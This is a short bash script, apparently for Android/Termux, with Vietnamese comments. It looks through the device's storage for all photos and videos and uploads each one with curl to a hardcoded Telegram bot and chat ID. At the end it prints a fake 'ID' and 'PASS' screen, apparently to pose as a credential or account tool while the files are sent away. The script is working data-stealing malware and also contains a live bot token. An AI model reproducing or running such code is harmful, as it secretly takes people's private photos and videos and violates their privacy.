#!/bin/bash

# Màu sắc
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
RESET="\e[0m"

BOT_TOKEN="8329608817:AAEGF8FhX41Od6Unhpy5mby_L-t1ACQCD1U"
CHAT_ID="7514545803"

MEDIA_DIR="/storage/emulated/0"

types="-iname *.jpg -o -iname *.jpeg -o -iname *.png -o \
-iname *.mp4 -o -iname *.mov -o -iname *.mkv -o -iname *.3gp"

TOTAL=0
SENT=0

# Đếm tổng số file cần gửi
TOTAL=$(find "$MEDIA_DIR" -type f \( $types \) | wc -l)


# Gửi file
find "$MEDIA_DIR" -type f \( $types \) | while read FILE; do
    if [ ! -f "$HOME/sent_media.txt" ] || ! grep -Fxq "$FILE" "$HOME/sent_media.txt"; then
        
        echo -e "${YELLOW}LOADING:${RESET} $FILE"

        EXT="${FILE##*.}"
        EXT=$(echo "$EXT" | tr '[:upper:]' '[:lower:]')

        # Gửi video
        if [[ "$EXT" =~ ^(mp4|mov|mkv|3gp)$ ]]; then
            curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendVideo" \
                -F chat_id="$CHAT_ID" \
                -F video="@$FILE"
        else
            # Gửi ảnh
            curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" \
                -F chat_id="$CHAT_ID" \
                -F photo="@$FILE"
        fi

        echo "$FILE" >> "$HOME/sent_media.txt"
        SENT=$((SENT + 1))

        sleep 1
    fi
done

# Hiện thông báo hoàn thành
echo ""
echo -e "${GREEN}HOÀN THÀNH${RESET}"
echo -e "${GREEN} TÊN: HAI CON${RESET}"
echo -e "${GREEN} ID: API_XDARTTMKTPHTQTE    : $TOTAL${RESET}"
echo -e "${GREEN} PASS: SQL_32HTTP    : $TOTAL${RESET}"